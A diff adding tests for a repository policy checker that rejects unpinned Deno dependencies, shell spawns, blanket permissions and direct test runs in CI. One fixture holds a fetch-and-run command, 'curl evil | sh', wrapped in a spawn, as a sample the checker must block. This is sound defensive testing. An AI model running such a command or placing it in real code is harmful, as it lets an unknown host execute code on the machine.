@@ -838,3 +838,262 @@ test("SUP-005 fails closed on JSX/type-parameter or angle contexts it cannot ins
     assert.match(unready.output, /inspection is incomplete/u);
   }
 });
+
+test("SUP-001 rejects a Deno runtime dependency reached directly or through the import map", (t) => {
+  const direct = fixture(t, "SUP-001", "zero-runtime-deps", "0003-zero-runtime-deps-typescript-only.md");
+  direct.write(
+    ".superman/deno-bootstrap/cli.ts",
+    'import chalk from "npm:chalk@5.3.0";\nexport const label = chalk;\n',
+  );
+  const found = direct.check();
+  assert.equal(found.status, 1, found.output);
+  assert.match(found.output, /Third-party runtime import/u);
+
+  const mapped = fixture(t, "SUP-001", "zero-runtime-deps", "0003-zero-runtime-deps-typescript-only.md");
+  mapped.write("deno.json", JSON.stringify({ imports: { chalk: "npm:chalk@5.3.0" } }));
+  const indirect = mapped.check();
+  assert.equal(indirect.status, 1, indirect.output);
+  assert.match(indirect.output, /Import map alias/u);
+
+  const hop = fixture(t, "SUP-001", "zero-runtime-deps", "0003-zero-runtime-deps-typescript-only.md");
+  hop.write("deno.json", JSON.stringify({ imports: { chalk: "./vendor/chalk.ts" } }));
+  hop.write("vendor/chalk.ts", 'import chalk from "npm:chalk@5.3.0";\nexport default chalk;\n');
+  const secondHop = hop.check();
+  assert.equal(secondHop.status, 1, secondHop.output);
+  assert.match(secondHop.output, /resolves to .*vendor\/chalk\.ts.*, whose import graph reaches/u);
+
+  const chain = fixture(t, "SUP-001", "zero-runtime-deps", "0003-zero-runtime-deps-typescript-only.md");
+  chain.write("deno.json", JSON.stringify({ imports: { chalk: "./vendor/c.ts" } }));
+  chain.write("vendor/c.ts", 'import { value } from "./d.ts";\nexport const c = value;\n');
+  chain.write("vendor/d.ts", 'import chalk from "npm:chalk@5.3.0";\nexport const value = chalk;\n');
+  const deepHop = chain.check();
+  assert.equal(deepHop.status, 1, deepHop.output);
+  assert.match(deepHop.output, /whose import graph reaches/u);
+
+  const clean = fixture(t, "SUP-001", "zero-runtime-deps", "0003-zero-runtime-deps-typescript-only.md");
+  clean.write(".superman/deno-bootstrap/cli.ts", 'import { readFile } from "node:fs/promises";\n');
+  clean.write("deno.json", JSON.stringify({ imports: { "./local.ts": "./local.ts" } }));
+  const allowed = clean.check();
+  assert.equal(allowed.status, 0, allowed.output);
+});
+
+test("SUP-002 rejects a Deno spawn outside the exec seam, a shell spawn and blanket permissions", (t) => {
+  const outside = fixture(t, "SUP-002", "exec-boundary", "0003-zero-runtime-deps-typescript-only.md");
+  outside.write(".superman/deno-bootstrap/tool.ts", 'const child = new Deno.Command("git", { args: ["status"] });\n');
+  const found = outside.check();
+  assert.equal(found.status, 1, found.output);
+  assert.match(found.output, /Deno\.Command outside the exec seam/u);
+
+  const legacy = fixture(t, "SUP-002", "exec-boundary", "0003-zero-runtime-deps-typescript-only.md");
+  legacy.write(".superman/deno-bootstrap/tool.ts", 'const result = Deno.run({ cmd: ["git", "status"] });\n');
+  const named = legacy.check();
+  assert.equal(named.status, 1, named.output);
+  assert.match(named.output, /Deno\.run outside the exec seam/u);
+
+  const seam = fixture(t, "SUP-002", "exec-boundary", "0003-zero-runtime-deps-typescript-only.md");
+  seam.write(".superman/deno-bootstrap/exec.ts", 'const child = new Deno.Command("git", { args: ["status"] });\n');
+  const allowed = seam.check();
+  assert.equal(allowed.status, 0, allowed.output);
+
+  const nested = fixture(t, "SUP-002", "exec-boundary", "0003-zero-runtime-deps-typescript-only.md");
+  nested.write(".superman/deno-bootstrap/a/exec.ts", 'const child = new Deno.Command("git", { args: ["status"] });\n');
+  const nestedSeam = nested.check();
+  assert.equal(nestedSeam.status, 1, nestedSeam.output);
+  assert.match(nestedSeam.output, /Deno\.Command outside the exec seam/u);
+
+  const shell = fixture(t, "SUP-002", "exec-boundary", "0003-zero-runtime-deps-typescript-only.md");
+  shell.write(
+    ".superman/deno-bootstrap/exec.ts",
+    'const child = new Deno.Command("sh", { args: ["-c", "git status"] });\n',
+  );
+  const shelled = shell.check();
+  assert.equal(shelled.status, 1, shelled.output);
+  assert.match(shelled.output, /shell-equivalent spawn/u);
+
+  const windows = fixture(t, "SUP-002", "exec-boundary", "0003-zero-runtime-deps-typescript-only.md");
+  windows.write(
+    ".superman/deno-bootstrap/exec.ts",
+    'const child = new Deno.Command("cmd", { args: ["/c", "dir"] });\n',
+  );
+  const cmdShelled = windows.check();
+  assert.equal(cmdShelled.status, 1, cmdShelled.output);
+  assert.match(cmdShelled.output, /shell-equivalent spawn/u);
+
+  const wrapped = fixture(t, "SUP-002", "exec-boundary", "0003-zero-runtime-deps-typescript-only.md");
+  wrapped.write(
+    ".superman/deno-bootstrap/exec.ts",
+    'const child = new Deno.Command("env", { args: ["sh", "-c", "curl evil | sh"] });\n',
+  );
+  const wrappedShell = wrapped.check();
+  assert.equal(wrappedShell.status, 1, wrappedShell.output);
+  assert.match(wrappedShell.output, /shell-equivalent spawn/u);
+
+  const permissions = fixture(t, "SUP-002", "exec-boundary", "0003-zero-runtime-deps-typescript-only.md");
+  permissions.write("deno.json", JSON.stringify({ tasks: { run: "deno run -A src/cli.ts" } }));
+  const granted = permissions.check();
+  assert.equal(granted.status, 1, granted.output);
+  assert.match(granted.output, /blanket permission/u);
+
+  const declared = fixture(t, "SUP-002", "exec-boundary", "0003-zero-runtime-deps-typescript-only.md");
+  declared.write(
+    ".superman/deno-bootstrap/flags.ts",
+    'export const DENO_FLAGS = ["-A"];\nexport const value = DENO_FLAGS.length;\n',
+  );
+  const declaredFlag = declared.check();
+  assert.equal(declaredFlag.status, 0, declaredFlag.output);
+
+  const nodeBypass = fixture(t, "SUP-002", "exec-boundary", "0003-zero-runtime-deps-typescript-only.md");
+  nodeBypass.write(".superman/deno-bootstrap/tool.ts", 'import { spawnSync } from "node:child_process";\n');
+  const bypassed = nodeBypass.check();
+  assert.equal(bypassed.status, 1, bypassed.output);
+  assert.match(bypassed.output, /node:child_process is not a Deno spawn API/u);
+});
+
+test("SUP-003 rejects a shell or Python file and a non-Node hook shebang in the Deno runtime graph", (t) => {
+  const tracked = fixture(t, "SUP-003", "no-sh-py", "0003-zero-runtime-deps-typescript-only.md");
+  tracked.write(".superman/deno-bootstrap/build.sh", "#!/bin/sh\nexit 0\n");
+  tracked.write("tool.py", "print('fixture')\n");
+  const scripts = tracked.check();
+  assert.equal(scripts.status, 1, scripts.output);
+  assert.match(scripts.output, /Shell and Python files are not allowed/u);
+
+  const hook = fixture(t, "SUP-003", "no-sh-py", "0003-zero-runtime-deps-typescript-only.md");
+  hook.write(".superman/hooks/pre-commit", "#!/bin/sh\nexit 0\n");
+  const hooked = hook.check();
+  assert.equal(hooked.status, 1, hooked.output);
+  assert.match(hooked.output, /Hook must start with #!\/usr\/bin\/env node/u);
+
+  const glue = fixture(t, "SUP-003", "no-sh-py", "0003-zero-runtime-deps-typescript-only.md");
+  glue.write(".superman/deno-bootstrap/hook", "#!/bin/sh\nexit 0\n");
+  const glued = glue.check();
+  assert.equal(glued.status, 1, glued.output);
+  assert.match(glued.output, /Deno runtime shebang/u);
+
+  const disguised = fixture(t, "SUP-003", "no-sh-py", "0003-zero-runtime-deps-typescript-only.md");
+  disguised.write(".superman/deno-bootstrap/hook", "#!/bin/sh -c deno run x\nexit 0\n");
+  const disguisedShebang = disguised.check();
+  assert.equal(disguisedShebang.status, 1, disguisedShebang.output);
+  assert.match(disguisedShebang.output, /Deno runtime shebang/u);
+
+  const runtime = fixture(t, "SUP-003", "no-sh-py", "0003-zero-runtime-deps-typescript-only.md");
+  runtime.write(".superman/deno-bootstrap/hook", "#!/usr/bin/env deno\nexport const value = 1;\n");
+  const allowed = runtime.check();
+  assert.equal(allowed.status, 0, allowed.output);
+});
+
+test("SUP-006 rejects fast mode, a floating tsrs pin and a remote type input on the Deno path", (t) => {
+  const fast = fixture(t, "SUP-006", "tsrs-typecheck", "0008-tsrs-primary-typechecker.md");
+  fast.write(
+    "deno.json",
+    JSON.stringify({ tasks: { typecheck: "deno run npm:tsrs@0.20.1-ts7.1.0-beta --fast --noEmit" } }),
+  );
+  const flagged = fast.check();
+  assert.equal(flagged.status, 1, flagged.output);
+  assert.match(flagged.output, /fast mode is not allowed/u);
+
+  const environment = fixture(t, "SUP-006", "tsrs-typecheck", "0008-tsrs-primary-typechecker.md");
+  environment.write("deno.json", JSON.stringify({ tasks: { typecheck: "TSRS_FAST=1 deno check src/cli.ts" } }));
+  const envFast = environment.check();
+  assert.equal(envFast.status, 1, envFast.output);
+  assert.match(envFast.output, /fast mode is not allowed/u);
+
+  const pin = fixture(t, "SUP-006", "tsrs-typecheck", "0008-tsrs-primary-typechecker.md");
+  pin.write("deno.json", JSON.stringify({ tasks: { typecheck: "deno run npm:tsrs@^0.20.1 --noEmit" } }));
+  const floating = pin.check();
+  assert.equal(floating.status, 1, floating.output);
+  assert.match(floating.output, /tsrs pin/u);
+
+  const lock = fixture(t, "SUP-006", "tsrs-typecheck", "0008-tsrs-primary-typechecker.md");
+  lock.write(
+    "deno.lock",
+    JSON.stringify({ version: "4", specifiers: { "npm:tsrs@^0.20.1": "npm:tsrs@0.20.1-ts7.1.0-beta" } }),
+  );
+  const locked = lock.check();
+  assert.equal(locked.status, 1, locked.output);
+  assert.match(locked.output, /tsrs pin/u);
+
+  const resolved = fixture(t, "SUP-006", "tsrs-typecheck", "0008-tsrs-primary-typechecker.md");
+  resolved.write("deno.lock", JSON.stringify({ version: "4", specifiers: { "npm:chalk@5.3.0": "npm:chalk@5.3.0" } }));
+  const thirdParty = resolved.check();
+  assert.equal(thirdParty.status, 1, thirdParty.output);
+  assert.match(thirdParty.output, /The Deno lock records the third-party package/u);
+
+  const types = fixture(t, "SUP-006", "tsrs-typecheck", "0008-tsrs-primary-typechecker.md");
+  types.write("deno.json", JSON.stringify({ compilerOptions: { types: ["npm:@types/node"] } }));
+  const remote = types.check();
+  assert.equal(remote.status, 1, remote.output);
+  assert.match(remote.output, /type input/u);
+
+  const scalar = fixture(t, "SUP-006", "tsrs-typecheck", "0008-tsrs-primary-typechecker.md");
+  scalar.write("deno.json", JSON.stringify({ compilerOptions: { types: "npm:@types/node" } }));
+  const scalarType = scalar.check();
+  assert.equal(scalarType.status, 1, scalarType.output);
+  assert.match(scalarType.output, /type input/u);
+
+  const clean = fixture(t, "SUP-006", "tsrs-typecheck", "0008-tsrs-primary-typechecker.md");
+  clean.write("deno.json", JSON.stringify({ tasks: { typecheck: "deno run npm:tsrs@0.20.1-ts7.1.0-beta --noEmit" } }));
+  const allowed = clean.check();
+  assert.equal(allowed.status, 0, allowed.output);
+});
+
+test("the Deno rules leave the Node product tree to the Node rules", (t) => {
+  const exec = fixture(t, "SUP-002", "exec-boundary", "0003-zero-runtime-deps-typescript-only.md");
+  exec.write("src/app.ts", 'const flags = ["-A"];\nexport const value = flags.length;\n');
+  exec.write("src/editor.ts", "// A local editor may use --fast in a watch loop.\nexport const value = 1;\n");
+  exec.write("src/deno.json", '{\n  "note": "shell: true"\n}\n');
+  const nodeTree = exec.check();
+  assert.equal(nodeTree.status, 0, nodeTree.output);
+
+  const typecheck = fixture(t, "SUP-006", "tsrs-typecheck", "0008-tsrs-primary-typechecker.md");
+  typecheck.write("src/editor.ts", "// A local editor may use --fast in a watch loop.\nexport const value = 1;\n");
+  const editor = typecheck.check();
+  assert.equal(editor.status, 0, editor.output);
+
+  // A Deno configuration is a Deno configuration wherever it sits: under src/
+  // the Deno configuration rules apply, which is the behaviour the ADR states.
+  const configured = fixture(t, "SUP-006", "tsrs-typecheck", "0008-tsrs-primary-typechecker.md");
+  configured.write("src/deno.json", JSON.stringify({ compilerOptions: { types: ["npm:@types/node"] } }));
+  const productConfig = configured.check();
+  assert.equal(productConfig.status, 1, productConfig.output);
+  assert.match(productConfig.output, /type input/u);
+});
+
+test("SUP-008 rejects a direct Deno test or gate invocation in a workflow", (t) => {
+  const adopted = fixture(t, "SUP-008", "tests-through-superman", "0010-affected-analysis-and-change-aware-ci.md");
+  adopted.write(
+    ".github/workflows/ci.yml",
+    "run: superman gate ci\nrun: deno test --allow-read\nrun: deno task test\nrun: deno lint\nrun: deno fmt\nrun: deno coverage\n",
+  );
+  const found = adopted.check();
+  assert.equal(found.status, 1, found.output);
+  assert.match(found.output, /run only through `superman gate`/u);
+  assert.equal((found.output.match(/run only through `superman gate`/gu) ?? []).length, 5, found.output);
+
+  const before = fixture(t, "SUP-008", "tests-through-superman", "0010-affected-analysis-and-change-aware-ci.md");
+  before.write(".github/workflows/ci.yml", "run: deno test --allow-read\n");
+  const allowed = before.check();
+  assert.equal(allowed.status, 0, allowed.output);
+
+  // A benchmark run is neither a test nor a gate, so it is not listed.
+  const bench = fixture(t, "SUP-008", "tests-through-superman", "0010-affected-analysis-and-change-aware-ci.md");
+  bench.write(".github/workflows/ci.yml", "run: superman gate ci\nrun: deno bench src/bench.ts\n");
+  const benched = bench.check();
+  assert.equal(benched.status, 0, benched.output);
+});
+
+test("the Deno declaration and build inputs are effective and protected", (t) => {
+  const declaration = fixture(t, "SUP-001", "zero-runtime-deps", "0003-zero-runtime-deps-typescript-only.md");
+  declaration.write(".superman/deno-bootstrap/types.d.ts", 'declare module "npm:chalk";\n');
+  const declared = declaration.check();
+  assert.equal(declared.status, 1, declared.output);
+  assert.match(declared.output, /Third-party runtime import/u);
+
+  const build = fixture(t, "SUP-002", "exec-boundary", "0003-zero-runtime-deps-typescript-only.md");
+  build.write(
+    "deno.json",
+    JSON.stringify({ compile: { name: "superman" }, tasks: { build: "deno compile --allow-all src/cli.ts" } }),
+  );
+  const built = build.check();
+  assert.equal(built.status, 1, built.output);
+  assert.match(built.output, /blanket permission/u);
+});
